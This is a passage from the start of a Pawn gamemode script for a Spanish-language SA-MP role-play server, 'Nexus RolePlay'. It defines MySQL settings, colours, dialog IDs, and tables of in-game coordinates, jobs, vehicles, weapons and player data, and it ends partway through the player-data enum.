//GameMode de Nexus RolePlay//

//Includes
#include <a_samp>
#include <utils>
#include <streamer>
#include <a_mysql>
#include <seifader>
#include <Anims>
#include <Objetos>
#include <progress2>
#include <mSelection>

//Defines
//----------- MYSQL ----------------//
#define SQL_HOST "localhost"
#define SQL_USER "root"
#define SQL_PASS ""
#define SQL_DB "nexusrp"

//----------- COLORES ----------------//
#define RojoIntenso         0xe70000FF
#define Rojo                0xa80707FF
#define RojoOscuro          0x5b0000FF
#define Azul                0x1229FAFF
#define Amarillo            0xfce80cFF
#define AmarilloClaro       0xfdfe8bFF
#define Ocre                0xa8961FFA
#define Verde               0x1eb032FF
#define VerdeClaro          0x88dd88FF
#define VerdeOscuro         0x036611FF
#define Naranja             0xff9c00FF
#define NaranjaOscuro       0xb57c01FF
#define Morado              0xC2A2DAFF
#define Fucsia              0xE800E877
#define Violeta             0x694cabFF
#define Gris                0xb0b0b0FF
#define GrisOscuro          0x666666FF
#define Blanco              0xFFFFFFFF
#define Blanco2             0xFFFFFF00
#define Negro               0x000000FF
#define Marron              0x562C2CD2
#define AzulOscuro          0x004d9bFF
#define AzulClaro           0x77c7ffFF
#define Rosa                0xfcc1fdFF
#define COLOR_OOCA          0x7bb7b7FF // chat OOC
#define COLOR_OOCB          0x4c9e9eFF // chat OOC
#define COLOR_OOCC          0x2e8787FF // chat OOC
#define COLOR_OOCD          0x187373FF // chat OOC
#define COLOR_OOCE          0x0a5555FF // chat OOC
#define Chat1               0xE6E6E6E6
#define Chat2               0xC8C8C8C8
#define Chat3               0xAAAAAAFF
#define Chat4               0x8C8C8C8C
#define Chat5               0x6E6E6E6E
#define Celeste             0x33CCAAFF
#define Aguamarina          0x00fcffFF
#define AguamarinaOscuro    0x02b1afFF

//----------- DIALOGIDs -----------------// Solo para indicar que ID corresponde a cada dialog
#define DialogLogueo 0 //Dialog de logueo
#define Ascensor 1 //Ascensor comisaria LSPD
#define Inventario 2 //Dialog del inventario
#define Vestuario 3 //Taquillas LSPD
#define Armeria 4 //Armeria LSPD
#define Cinturon 5 //Cinturón LSPD
#define Maletero 6 //Maleteros vehículos
#define AutoescuelaCondIntro 7 //Introducción autoescuela conducción
#define AutoescuelaCondTema1 8 //Tema autoescuela conducción
#define AutoescuelaCondTema2 9 //Tema autoescuela conducción
#define AutoescuelaCondTema3 10 //Tema autoescuela conducción
#define AutoescuelaCondTema4 11 //Tema autoescuela conducción
#define AutoescuelaCondTema5 12 //Tema autoescuela conducción
#define AutoescuelaCondTema6 13 //Tema autoescuela conducción
#define AutoescuelaCondFinTema 14 //Final temas autoescuela conducción
#define AutoescuelaCondPregunta1 15 //Pregunta autoescuela conducción
#define AutoescuelaCondPregunta2 16 //Pregunta autoescuela conducción
#define AutoescuelaCondPregunta3 17 //Pregunta autoescuela conducción
#define AutoescuelaCondPregunta4 18 //Pregunta autoescuela conducción
#define AutoescuelaCondPregunta5 19 //Pregunta autoescuela conducción
#define Armario 20 //Armario casas
#define Almacen 21 //Almacén negocios
#define Agenda 22 //Agenda móvil
#define ContactoArmas 23 //Mafias compran armas
#define ATMMenu 24 //Menú principal del cajero
#define ATMRetirar 25 //Retirar pasta
#define ATMIngresar 26 //Ingresar pasta
#define ATMTransferirID 27 //Transferir pasta
#define ATMTransferirCantidad 28 //Transferir pasta
#define ATMBalanced 29 //Balance
#define DialogAFK 30 //Anti afk
#define VestuarioPrision 31 //Taquillas prisión
#define ArmeriaPrision 32 //Armeria prisión
#define InformesLSED 33 //Armeria prisión
#define NuevaArmeriaLSPD1 34 //Nueva armería LSPD lista 1
#define NuevaArmeriaLSPD2 35 //Nueva armería LSPD lista 2

#define NOEXISTE (-1) //NOEXISTE

#define ADMIN_SPEC_TYPE_NONE	0 //Sistema RECON
#define ADMIN_SPEC_TYPE_PLAYER 	1
#define ADMIN_SPEC_TYPE_VEHICLE 2

#define MAX_LSEDINFORMES 200 //Max informes LSED

#define MAX_DROP_ITEM 1000 //Máximo de objetos caídos en el suelo

#define MAX_CAR_DATA 100 //Máximo de coches de concesionario

#define MAX_VEHPUBLICO 88 //Vehículos de jobs y facciones

#define MAX_COPOBJS 300 //Máximo objetos de tráfico

#define MAX_HOUSES 1000 //Número máximo de casas

#define MAX_NEGS 200 //Número máximo de negocios

#define MIN_CAR_HEALTH 350 //Daños máximos que puede soportar un vehículo

//Sistema hambre y sed
#define MIN_HAMBRE 20 //Hambre mínima
#define MIN_SED 15 //Sed mínima

#define MAX_HAMBRE 240 //Hambre máxima
#define MAX_SED 180 //Sed máxima

#define MAX_TURFS 80 //Máximos turfs

#define MAX_FACCS 30 //Máximas facciones

#define MAX_PLANTACIONES 400 //Máximas plantaciones

#define MAX_LUGARESPINTAR 29 //Misiones de pintar

#define MAX_PING 600 //Máximo ping permitido

#define MAX_SALUDOS 7 //Comando /saludo

//Listas
enum ieInfo //Informes LSED
{
	Float:ieX,
	Float:ieY,
	Float:ieZ,
	ieJugador,
	ieTimer,
	ieEstado // NOEXISTE - Vacío | 0 - Sin atender | 1 - En camino
}
new InformeEmergencias[MAX_LSEDINFORMES][ieInfo];

enum saludo //Comando /saludo
{
	animliba[24],
	animnamea[64],
}
new animsaludo[MAX_SALUDOS][saludo]=
{
	{	"GANGS", "prtial_hndshk_biz_01"},
	{	"GANGS", "hndshkcb"},
	{	"GANGS", "hndshkea"},
	{	"GANGS", "hndshkfa"},
	{	"GANGS", "hndshkba"},
	{	"ON_LOOKERS", "wave_loop"},
	{	"PED", "endchat_03"}
}; // nº animación para saludo coordinado

new	Float:barbell_pos[][] = //Sistema fuerza /Entrenar
{
	{ 774.42907715,1.88309872,1000.48834229,0.00000000,270.00000000,87.99966431 }, // Los Santos Gym's BarBell
	{ 765.85528564,-48.86857224,1000.64093018,0.00000000,89.49993896,0.00000000 }, // San Fierro Gym's BarBell.
	{ 765.34039307,-59.18271637,1000.63793945,0.00000000,89.49993896,181.25012207 } // Las Venturas Gym's BarBell
};

new Float:PressBancaPlayerPos[][] = //Sistema fuerza /Entrenar
{
	{ 773.0491,1.4285,1000.7209, 269.2024 }, // Los Santos Gym's bench.
	{ 766.3170,-47.3574,1000.5859, 179.2983 }, // San Fierro Gym's bench.
	{ 764.9001,-60.5580,1000.6563, 1.9500 } // Las Venturas Gym's bench
};

enum PintarInfo //Misión graffitis
{
	Float:GraffitiX,
	Float:GraffitiY,
	Float:GraffitiZ,
	Float:GraffitiRotZ,
	GraffitiObjeto,
	Texto,
}

new LugaresPintar[MAX_LUGARESPINTAR][PintarInfo] = {
{2452.8999000,-1758.4000000,15.0000000,90.0000000,17969}, // (2)
{2473.1001000,-1902.2800000,14.6000000,270.0000000,17969}, // (3)
{2519.0500000,-1956.7000000,14.8000000,180.0000000,17969}, // (4)
{2238.6001000,-1687.4900000,15.2000000,90.0000000,17969}, // (5)
{2743.6899000,-1947.7800000,14.6000000,270.0000000,17969}, // (6)
{2756.3501000,-2027.5100000,14.6000000,180.0000000,17969}, // (7)
{2688.8000000,-2065.2700000,15.1000000,270.0000000,17969}, // (8)
{2351.0000000,-2024.0900000,14.5000000,180.0000000,17969}, // (9)
{2365.8000000,-1910.0000000,14.5000000,0.0000000,17969}, // (10)
{2101.6001000,-1868.4600000,14.6000000,270.0000000,17969}, // (11)
{1992.8000000,-1568.9900000,14.6000000,315.0000000,17969}, // (12)
{1929.0200000,-2017.7000000,14.5000000,180.0000000,17969}, // (13)
{1860.0000000,-2095.5000000,14.2000000,90.0000000,17969}, // (14)
{2112.7000000,-1942.9698000,13.8500000,90.0000000,17969}, // (15)
{2457.3999000,-2065.2700000,14.6000000,270.0000000,17969}, // (16)
{2812.3999000,-1534.2000000,12.4000000,90.0000000,17969}, // (17)
{2668.1499000,-1586.1899000,16.2000000,180.0000000,17969}, // (18)
{2536.8000000,-1476.8500000,25.2000000,270.0000000,17969}, // (19)
{2397.1001000,-1468.2600000,24.6000000,90.0000000,17969}, // (21)
{2335.0701000,-1319.5900000,25.2000000,180.0000000,17969}, // (22)
{2184.5000000,-1338.1500000,25.0000000,90.0000000,17969}, // (23)
{2019.4800000,-1293.3000000,24.6000000,180.0000000,17969}, // (24)
{2009.7000000,-1089.9100000,25.3000000,70.0000000,17969}, // (25)
{2235.1001000,-1001.9100000,60.4000000,325.0000000,17969}, // (26)
{2684.0000000,-1114.3199000,70.2000000,270.0000000,17969}, // (27)
{2057.6299000,-1770.9000000,14.3000000,0.0000000,17969}, // (28)
{2420.9500000,-1391.0000000,25.2000000,0.0000000,17969}, // (29)
{2458.8899000,-1707.3300000,14.6600000,90.0000000,17969}, // (30)
{1813.5000000,-1425.6000000,14.6000000,0.0000000,17969} // (31)
};

new PreciosContactoArmas[23] =
{
700, //Katana x3

7400, //M1911 x7
1000, //Cargador M1911 x7
1800, //Balas .45 ACP x4 (400 balas)

9500, //D. Eagle x5
1400, //Cargador D. Eagle x5
1500, //Balas .50 AE x2 (200 balas)

9000, //Tec-9 x5
1300, //Cargador Tec-9 x5
9200, //UZI x5
1300, //Cargador UZI x5
12000, //MP5 x5
1500, //Cargador MP5 x5
1700, //Balas SMG x3 (300 balas)

7800, //Escopeta x3
8400, //Escopeta recortada x4
1700, //Cartuchos 12GA x2 (100 balas)

16000, //Ak-47 x3
2200, //Cargador Ak-47 x3
2600, //Balas Ak-47 x2 (140 balas)

12000, //Rifle x3
1700, //Cargador rifle x3
2500 //Balas rifle x2 (140 balas)
};

new Float:PuntosDeposito[] =
{
	1599.5999800, -1843.3000500,
	1659.5000000, -1843.3000500,
	1660.5000000, -1803.0000000,
	1634.6999500, -1803.0000000,
	1595.1999500, -1787.0000000,
	1595.3000500, -1819.9000200,
	1599.5000000, -1819.9000200
};

enum JobInfo
{
	Float:Jx,
	Float:Jy,
	Float:Jz,
	JobNombre[50],
	JobPay,
}

new Jobs[10][JobInfo] = {
{2102.7148,-1788.1221,13.5547, "Pizzero", 100}, //300$
{1615.9548,-1896.8372,13.5490, "Barrendero", 100}, //400$
{591.2120,-1285.1656,15.9905, "Securicar", 100}, //600$
{-382.5518,-1426.3771,26.2122, "Cosechador", 100}, //550$
{-420.8934,-1750.6937,6.8467, "Fumigador aéreo", 100}, //700$
{1753.1420,-1894.1234,13.5572, "Taxista", 100},
{2512.6462,-2072.1052,13.6369, "Mecánico", 100}, //Taller Willowfield
{2123.2236,-1185.7349,24.0278, "Ladrón", 0},
{2956.0686,-1523.8318,2.3078, "Pescador", 100}, //220$-1100$
{1908.6183,-1857.4739,13.5620, "Mecánico*", 0} //Taller unity
};

new Float:Mostradores[31][3] = {
{-22.1840,-138.3363,1003.5469}, //Mostrador 24/7 1
{-23.4186,-55.2088,1003.5469}, //Mostrador 24/7 2
{681.4297,-453.3886,-25.6172}, //Barra bar 1
{-225.2983,1404.2106,27.7734}, //Barra bar 2
{498.3913,-75.4957,998.7578}, //Barra bar 3
{453.4103,-107.5514,999.4292}, //Barra restaurante 1
{2258.0786,1622.2975,1637.5493}, //Barra restaurante 2
{450.4141,-84.0793,999.5547}, //Barra restaurante 3
{447.6464,-62.7804,999.3400}, //Barra restaurante 4
{-783.9854,500.2360,1371.7422}, //Barra restaurante 5
{375.7310,-119.3098,1001.4995}, //Comida rápida 1
{379.0211,-187.8832,1000.6328}, //Comida rápida 2
{378.1023,-67.8428,1001.5151}, //Comida rápida 3
{369.6903,-6.6289,1001.8589}, //Comida rápida 4
{499.6445,-20.7924,1000.6797}, //Barra discoteca
{1207.3638,-28.6835,1000.9531}, //Barra puticlub 1
{969.2510,-44.8382,1001.1172}, //Barra puticlub 2
{1214.2813,-13.1513,1000.9219}, //Barra puticlub 3
{-2653.5898,1407.5006,906.2734}, //Barra puticlub 4
{290.1703,-109.3636,1001.5156}, //Ammu nation 1
{295.5641,-80.5888,1001.5156}, //Ammu nation 2
{-1753.8821,790.4277,167.6844}, //Tienda deportiva
{-2326.7366,927.7168,59.7178}, //Ferretería
{1005.5494,52.8569,55.3221}, //Tienda electrónica
{683.7972,-661.1636,-46.2927}, //Estanco y licorería
{206.4069,-100.7421,1005.2578}, //Tienda ropa 1
{162.8261,-83.6720,1001.8047}, //Tienda ropa 2
{204.4586,-159.5702,1000.5234}, //Tienda ropa 3
{206.6214,-8.0639,1001.2109}, //Tienda ropa 4
{203.9312,-43.5412,1001.8047}, //Tienda ropa 5
{207.0655,-129.3970,1003.5078} //Tienda ropa 6
};

new Float:ChecksBarrendero[63][3] = {
{1964.38, -1764.67, 13.0885},
{1823.9, -1592.18, 13.0617},
{2029.52, -1343.93, 23.5257},
{2073.47, -1107.66, 24.2636},
{1658.03, -1158.95, 23.4583},
{1217.41, -1140.59, 23.2998},
{1004.9, -955.393, 41.4368},
{940.333, -1186.51, 19.0471},
{1058.04, -1452.01, 13.07},
{856.354, -1591.43, 13.0918},
{639.971, -1502.19, 14.4376},
{486.394, -1350.07, 16.9588},
{322.191, -1566.6, 32.8108},
{552.577, -1671.29, 18.2101},
{816.962, -1644.78, 13.0901},
{1270.54, -1574.12, 13.0882},
{1304.64, -1855.4, 13.0881},
{1432.32, -1669.32, 13.0882},
{1526.74, -1670.45, 13.0875},
{1777.65, -1734.26, 13.0879},
{1732.65, -1852.48, 13.1194},
{1964.43, -1767.62, 13.0877},
{2155.64, -1754.3, 13.0947},
{2215.28, -1834.55, 13.9008},
{2297.19, -2069.65, 13.0798},
{2717.11, -2024.72, 13.0256},
{2518.57, -1829.48, 13.0777},
{2645.51, -1681.29, 10.4814},
{2611.04, -1441.45, 32.2996},
{2373.57, -1279.51, 23.5383},
{2246.77, -1137.94, 25.7358},
{2103.84, -1218.74, 23.5088},
{1823.86, -1258.62, 13.1781},
{1452.58, -1331.79, 13.0882},
{1420.97, -1395.09, 13.088},
{1303.77, -1278.29, 13.0882},
{1195.85, -1367.73, 13.0275},
{1147.5, -1627.83, 13.4866},
{1237.95, -1855.09, 13.0882},
{1391.41, -1797.25, 13.0882},
{1649.77, -1594.83, 13.0967},
{1746.96, -1704.31, 13.0882},
{1964.01, -1766.7, 13.0877},
{1818.84, -1781.28, 13.0882},
{1686.8, -1826.84, 13.0877},
{1447.06, -1870.17, 13.0956},
{1079.21, -1849.85, 13.0949},
{920.402, -1687.3, 13.0886},
{919.322, -1344.71, 12.9831},
{1087.42, -1283.57, 13.1337},
{1245.23, -1150.1, 23.282},
{1263.48, -952.624, 40.97},
{1548.01, -966.395, 36.9975},
{2198.8, -1117.81, 24.9207},
{1966.87, -1186.96, 25.5139},
{1845.4, -1387.62, 13.0962},
{1693.89, -1438.55, 13.0881},
{1680.25, -1544.35, 13.0866},
{1686.6, -1693.36, 13.0866},
{1924.87, -1754.71, 13.0863},
{2037.46, -1615.29, 13.0874},
{2014.07, -1810.13, 13.0882},
{1824.48, -1907.55, 13.0729}
};

new Float:ChecksCosechador[18][3] = {
{-322.4297,-1475.6787,14.2840},
{-258.2964,-1485.2852,6.5286},
{-234.9556,-1522.3761,8.0218},
{-296.3396,-1543.0264,10.2185},
{-182.4065,-1409.5905,4.0504},
{-185.1138,-1358.1989,5.3088},
{-231.4681,-1332.0410,10.8363},
{-287.8214,-1342.2283,8.4548},
{-292.0815,-1391.9467,12.1514},
{-253.6083,-1375.1813,11.2880},
{-384.9917,-1365.8877,24.4146},
{-452.0677,-1385.6948,25.3850},
{-543.4974,-1409.8652,14.7486},
{-565.0435,-1334.7450,23.2383},
{-492.0044,-1314.4167,30.6119},
{-399.2313,-1296.9722,31.2470},
{-417.7039,-1334.4792,27.0369},
{-481.5393,-1343.8591,28.5447}
};

new Float:ChecksFumigador[14][3] = {
{-560.5481,-1398.6001,46.7124},
{-565.9540,-1330.2577,51.9021},
{-429.5224,-1286.1316,52.0331},
{-328.6955,-1321.0922,41.6528},
{-244.8168,-1357.9639,31.2759},
{-233.6895,-1449.9918,27.9477},
{-291.9164,-1514.7799,30.2744},
{-396.5044,-1595.7528,45.7363},
{-411.6466,-1626.2190,49.3483},
{-403.2556,-1489.7595,41.2128},
{-385.8501,-1555.2289,40.1053},
{-465.9271,-1636.8960,27.9015},
{-488.2023,-1731.0664,49.7307},
{-465.2697,-1816.8821,26.0843}
};

new Float:ChecksPescador[14][3] = {
{3000.3999000,-1300.5000000,0.0000000},
{2991.3000000,-1215.0000000,0.0000000},
{3085.7000000,-1230.6000000,0.0000000},
{3036.8000000,-1136.5000000,0.0000000},
{3165.3999000,-1130.0000000,0.0000000},
{3228.0000000,-1230.0000000,0.0000000},
{3123.0000000,-1319.8000000,0.0000000},
{3151.0000000,-1231.1000000,0.0000000},
{3103.2000000,-1160.7000000,0.0000000},
{3096.8000000,-1075.4000000,0.0000000},
{3251.8000000,-1126.7000000,0.0000000},
{3314.6001000,-1186.5000000,0.0000000},
{3207.8999000,-1307.8000000,0.0000000},
{3057.7000000,-1358.3000000,0.0000000}
};

new Float:ChecksPracticoCoche[25][3] = {
{2083.8384,-1909.9130,13.0878},
{2064.1917,-1750.0286,13.0916},
{1806.7062,-1730.0574,13.0952},
{1532.0228,-1719.6244,13.0885},
{1469.6788,-1590.0376,13.0883},
{1327.1499,-1570.3623,13.0696},
{1359.5898,-1420.1453,13.0885},
{1275.1090,-1392.8582,12.8965},
{1193.8380,-1452.7954,13.0884},
{1170.4027,-1569.7462,13.0187},
{1147.9176,-1695.4690,13.4866},
{1173.0892,-1829.7229,13.1053},
{1315.5731,-1854.8386,13.0883},
{1500.7313,-1874.6880,13.0884},
{1691.8389,-1833.0457,13.0876},
{1805.4043,-1834.7416,13.0898},
{1824.0209,-1768.3755,13.0875},
{2066.3369,-1754.5487,13.0989},
{2187.1626,-1746.5713,13.0838},
{2213.2336,-1755.7191,13.0602},
{2216.1309,-1877.9962,13.0873},
{2097.3159,-1891.9930,13.0653},
{2070.7659,-1930.3083,13.1709},
{2056.5637,-1912.8885,13.2516},
{2056.5637,-1912.8885,13.2516}
};

new Float:ChecksPracticoAvion[20][3] = {
{1990.5405,-2493.9075,13.9999}, // CHECKPOINT NORMAL
{1626.7603,-2493.7266,35.0753},
{1382.7904,-2495.9976,70.4945},
{1136.2195,-2250.9355,126.3928},
{1086.2787,-1989.6184,156.3511},
{1081.8361,-1656.4224,141.6575},
{1209.8287,-1189.9451,139.0757},
{1337.7214,-717.1565,167.4657},
{1679.4834,-579.6104,178.6736},
{2135.8313,-698.1968,230.3436},
{2310.5337,-1147.2543,206.4147},
{2081.8853,-1489.0309,162.9519},
{1531.5393,-1678.0157,129.7650},
{890.2695,-1796.2018,128.2029},
{650.6389,-2122.5435,117.1550},
{955.8991,-2429.2781,69.4324},
{1360.0757,-2490.7454,39.1671},
{1896.0840,-2494.7896,14.0299}, //CHECKPOINT NORMAL
{1991.5916,-2286.5642,14.0084}, //CHECKPOINT NORMAL
{1991.5916,-2286.5642,14.0084} //CHECKPOINT NORMAL
};

new Float:ChecksPracticoBarco[22][3] = {
{2955.8306,-1566.0105,0.0000},
{2952.9165,-1731.8145,0.0000},
{2933.9338,-1878.5146,0.0000},
{2967.1619,-1997.9015,0.0000},
{2915.7917,-2200.9465,0.0000},
{2687.1826,-2288.4944,0.0000},
{2589.1243,-2259.1838,0.0000}, //-Inicio zig zag
{2537.5554,-2310.5278,0.0000},
{2432.0896,-2283.2939,0.0000},
{2411.4243,-2407.7388,0.0000},
{2293.3662,-2466.7073,0.0000}, //Último zig zag
{2334.9001,-2512.5293,0.0000},
{2322.9963,-2728.0398,0.0000},
{2515.9067,-2749.3672,0.0000},
{2793.8657,-2633.9517,0.0000},
{2903.1611,-2467.6028,0.0000},
{2971.9250,-2207.9082,0.0000},
{2974.5806,-1991.9218,0.0000},
{2933.9338,-1878.5146,0.0000},
{2955.8306,-1566.0105,0.0000},
{0.00000,0.0000,0.0000},
{0.00000,0.0000,0.0000}
};

enum AutoInfo
{
	Float:AutoX,
	Float:AutoY,
	Float:AutoZ,
	AutoNombre[50],
}

new AutoEscuelas[6][AutoInfo] = {
{-2032.9701,-117.4753,1035.1719,"Permiso de conducción"},
{2017.1357,-2274.4543,13.5969,"Permiso de aviación"},
{2943.1257,-1552.9116,2.0250,"Permiso de navegación"},
{267.6152,107.5762,1008.8203,"Permiso de armas"},
{358.4051,187.1362,1008.3828,"Permiso de pesca"},
{358.4051,183.5721,1008.3828,"Permiso de caza"}
};

new VehicleNames[][] = //Nombres de modelos de vehículos
{
    "Landstalker", "Bravura", "Buffalo", "Linerunner", "Perrenial", "Sentinel",
    "Dumper", "Firetruck", "Trashmaster", "Stretch", "Manana", "Infernus",
    "Voodoo", "Pony", "Mule", "Cheetah", "Ambulancia", "Leviathan", "Moonbeam",
    "Esperanto", "Taxi", "Washington", "Bobcat", "Whoopee", "BF Injection",
    "Hunter", "Premier", "Enforcer", "Securicar", "Banshee", "Predator", "Bus",
    "Rhino", "Barracks", "Hotknife", "Trailer", "Previon", "Coach", "Cabbie",
    "Stallion", "Rumpo", "RC Bandit", "Romero", "Packer", "Monster", "Admiral",
    "Squalo", "Seasparrow", "Pizzaboy", "Tram", "Trailer", "Turismo", "Speeder",
    "Reefer", "Tropic", "Flatbed", "Yankee", "Caddy", "Solair", "Berkley's RC Van",
    "Skimmer", "PCJ-600", "Faggio", "Freeway", "RC Baron", "RC Raider", "Glendale",
    "Oceanic","Sanchez", "Sparrow", "Patriot", "Quad", "Coastguard", "Dinghy",
    "Hermes", "Sabre", "Rustler", "ZR-350", "Walton", "Regina", "Comet", "BMX",
    "Burrito", "Camper", "Marquis", "Baggage", "Dozer", "Maverick", "News Chopper",
    "Rancher", "FBI Rancher", "Virgo", "Greenwood", "Jetmax", "Hotring", "Sandking",
    "Blista Compact", "Police Maverick", "Boxville", "Benson", "Mesa", "RC Goblin",
    "Hotring Racer A", "Hotring Racer B", "Bloodring Banger", "Rancher", "Super GT",
    "Elegant", "Journey", "Bike", "Mountain Bike", "Beagle", "Cropduster", "Stunt",
    "Tanker", "Roadtrain", "Nebula", "Majestic", "Buccaneer", "Shamal", "Hydra",
    "FCR-900", "NRG-500", "HPV1000", "Cement Truck", "Tow Truck", "Fortune",
    "Cadrona", "FBI Truck", "Willard", "Forklift", "Tractor", "Combine", "Feltzer",
    "Remington", "Slamvan", "Blade", "Freight", "Streak", "Vortex", "Vincent",
    "Bullet", "Clover", "Sadler", "Firetruck", "Hustler", "Intruder", "Primo",
    "Cargobob", "Tampa", "Sunrise", "Merit", "Utility", "Nevada", "Yosemite",
    "Windsor", "Monster", "Monster", "Uranus", "Jester", "Sultan", "Stratium",
    "Elegy", "Raindance", "RC Tiger", "Flash", "Tahoma", "Savanna", "Bandito",
    "Freight Flat", "Streak Carriage", "Kart", "Mower", "Dune", "Sweeper",
    "Broadway", "Tornado", "AT-400", "DFT-30", "Huntley", "Stafford", "BF-400",
    "News Van", "Tug", "Trailer", "Emperor", "Wayfarer", "Euros", "Hotdog", "Club",
    "Freight Box", "Trailer", "Andromada", "Dodo", "RC Cam", "Launch", "Patrulla LSPD",
    "Patrulla SFPD", "Patrulla LVPD", "Ranger de policía", "Picador", "S.W.A.T", "Alpha",
    "Phoenix", "Glendale", "Sadler", "Luggage", "Luggage", "Stairs", "Boxville",
    "Tiller", "Utility Trailer"
};

new Float:RandLogin[5][9] = //Vistas al loguear
{
{1419.3607, -1630.4677, 54.4267, 1491.6999, -1684.9000, 14.1900, 1405.0000, -1621.0000, 49.0000}, //Ayuntamiento
{515.0692, -1557.2420, 42.1758, 541.9000, -1468.1999, 14.3999, 511.0000, -1548.0000, 23.0000}, //Little Italy
{2107.2641, -1870.8756, 31.2371, 2084.3000, -1813.6999, 13.0000, 2104.0000, -1877.0000, 15.0000}, //Pizzeria
{1809.6683, -1814.1533, 51.6329, 1827.0000, -1863.8000, 13.0000, 1732.2802,-1879.2351,13.5623}, //Unity
{133.2111, -1973.0588, 50.5363, 226.8999, -1939.4000, 41.2000, 154.0000, -1952.0000, 11.0000} //Playa
};

new GunNames[47][] = //Nombre de armas
{ 
"Puños",
"Puño americano",
"Palo de golf",
"Porra",
"Cuchillo",
"Bate",
"Pala",
"Palo de billar",
"Katana",
"Motosierra",//
"Dildo rosa",
"Dildo blanco",
"Vibrador blanco",
"Vibrador plateado",
"Ramo de flores",
"Bastón",
"Granada",
"Granada de gas",
"Cóctel molotov",
"",
"",
"",
"M1911",//
"M1911 silenciada",
"Desert Eagle",
"Escopeta",
"Escopeta recortada",
"Escopeta de combate",
"UZI",
"MP5",
"AK-47",
"M16",
"TEC-9",//
"Rifle",
"Rifle francotirador",
"Bazoka",
"Bazoka térmico",
"Lanzallamas",
"Minigun",
"C4",
"Detonador",
"Spray",
"Extintor",//
"Cámara",
"Gafas nocturnas",
"Gafas térmicas",
"Paracaidas"
};

enum CajeroInfo //Puntos de cajeros
{
	Float:cX,
	Float:cY,
	Float:cZ,
}

new Cajeros[48][CajeroInfo] = {
{1811.1999500,-1873.8000500,13.1000000},
{2723.5000000,-2030.3000500,13.1000000},
{2423.0000000,-1991.3000500,13.1000000},
{2507.3000500,-1919.9000200,13.1000000},
{2156.5000000,-1903.6999500,13.1000000},
{1972.5999800,-1999.5000000,13.1000000},
{1631.9000200,-2237.8999000,13.1000000},
{1583.0999800,-1863.0999800,13.1000000},
{1370.3000500,-1856.6999500,13.1000000},
{1073.5000000,-1861.5000000,13.1000000},
{2502.6999500,-1725.0999800,13.1000000},
{2059.3184000,-1761.4301000,13.1000000},
{1922.0000000,-1765.5000000,13.1000000},
{1363.4000200,-1758.1999500,13.1000000},
{1767.1999500,-1722.9000200,13.1000000},
{1174.1999500,-1702.9000200,13.6000000},
{433.7000100,-1728.8000500,9.1000000},
{2811.6999500,-1648.0000000,10.4000000},
{1674.5000000,-1613.5999800,13.1000000},
{1410.8000500,-1583.0999800,13.1000000},
{1169.0000000,-1581.5000000,13.1000000},
{852.4000200,-1616.0000000,13.1000000},
{606.9000200,-1572.9000200,15.7000000},
{387.2999900,-1864.9000200,7.4000000},
{342.1000100,-1601.5000000,32.8000000},
{2751.5000000,-1465.4000200,30.0000000},
{2652.0000000,-1452.8000500,30.1000000},
{2440.6999500,-1480.9000200,23.6000000},
{2321.8000500,-1375.0999800,23.6000000},
{2669.1999500,-1095.5000000,68.9000000},
{2154.3999000,-1019.5999800,62.3000000},
{2238.3999000,-1150.0000000,25.4000000},
{1970.9000200,-1283.0999800,23.5000000},
{1549.5000000,-1715.3000500,13.1000000},
{1779.3000500,-1190.5999800,23.5000000},
{1805.1999500,-1353.0000000,14.8000000},
{1493.0999800,-1152.0000000,23.6000000},
{1366.9000200,-1307.0000000,13.1000000},
{1573.8000500,-1431.5999800,13.1000000},
{1320.8000500,-898.2000100,39.1000000},
{1103.8000500,-1290.1999500,13.1000000},
{1102.8000500,-1425.5000000,15.4000000},
{1065.8000500,-1026.8000500,31.7000000},
{909.4000200,-1337.8000500,13.1000000},
{777.5999800,-1064.4000200,24.3000000},
{512.7999900,-1468.6999500,14.5000000},
{485.6000100,-1271.6999500,15.3000000},
{780.9000200,-1423.8000500,13.1000000}
};

enum plantaInfo
{
	plSQLID,
	plTipo,
	Float:plX,
	Float:plY,
	Float:plZ,
	plPlantador[36],
	plEstado,
	Text3D:plPickup,
	plObjeto,
	plVW,
	plInt,
}
new PlantaInfo[MAX_PLANTACIONES][plantaInfo];

enum pInfo //Información jugador
{
	pContra[128], //Contraseña
	pSQLID,
	pNombre[41], //Nombre RP del jugador
	pCuentaForo[40], //Cuenta del foro
	pAdmin, //Nivel admin
	pAdminNombre[16], //Nick del admin
	pBloqueado, //Si está ban
	pPrimerLogueo, //Primera vez que entra
	pPrimerLugarSpawn, //Dónde eligió spawnear al registrarse en PCU
	pPrimeraMejora, //Mejora elegida al registrarse en PCU
	pEdad, //Edad del jugador IC
	pSexo, //Género del jugador IC
	pNivel, //Nivel del jugador
	pExp, //Experiencia del jugador
	Float:pVida, //Vida del jugador
	Float:pChaleco, //Armadura del jugador
	pTelefono, //Teléfono del jugador
	pTrabajo, //Trabajo del jugador
	pContrato, //Horas de permanencia de trabajo
	pEsperaTrabajar, //Tiempo de espera para volver a trabajar
	Float:pPosX, //Posición X
	Float:pPosY, //Posición Y
	Float:pPosZ, //Posición Z
	pDineroBanco, //Dinero en banco
	pDineroMano, //Dinero en cartera
	pEncarcelado, //Encarcelado
	pTiempoCarcel, //Tiempo de prisión
	pAdvertencias, //Advertencias del jugador
	pSpecID, //Sistema RECON
	pSpecType, //Sistema RECON
	pSkin, //Skin del jugador
	pFaccion, //Facción del jugador
	pRango, //Rango del jugador de una facción
	pLider, //Liderazgo de una facción
	pPuntosRol, //Puntos de rol
	pHabPistola, //Habilidad M1911
	pHabSD, //Habilidad Silenciada
	pHabDEagle, //Habilidad Desert Eagle
	pHabEscopeta, //Habilidad escopeta
	pHabSawnoff, //Habilidad escopeta recortada
	pHabEscopetaCom, //Habilidad escopeta de combate
	pHabUZI, //Habilidad TEC-9 y UZI
	pHabMP5, //Habilidad MP5
	pHabAK47, //Habilidad AK47
	pHabM4, //Habilidad M4
	pHabFranco, //Habilidad francotirador
	pInterior, //Interior del jugador al desconectarse
	pVirtualWorld, //VW del jugador al desconectarse
	pBol[8], //Slot de cada bolsillo
	pBolCant[8], //Cantidad de cada bolsillo
	pManoIzq, //Objeto en mano izquierda
	pManoIzqCant, //Cantidad objeto mano izquierda
	pManoDer, //Objeto en mano derecha
	pManoDerCant, //Cantidad objeto en mano derecha
	pMuerto, //Sistema de muerte (en crack)
	pEspalda, //Arma en la espalda
	pEspaldaCant, //Munición en la espalda
	pCint[8], //Slot de cada cinturón
	pCintCant[8], //Cantidad de cada cinturón
	pServicioPD, //Servicio LSPD
	pLlaveCoche[5], //Llaves de vehiculos propios
	pLlaveCochePrestado[5], //Llaves de vehiculos prestados
	pMinPayDay, //Minutos conectados en relacción al payday
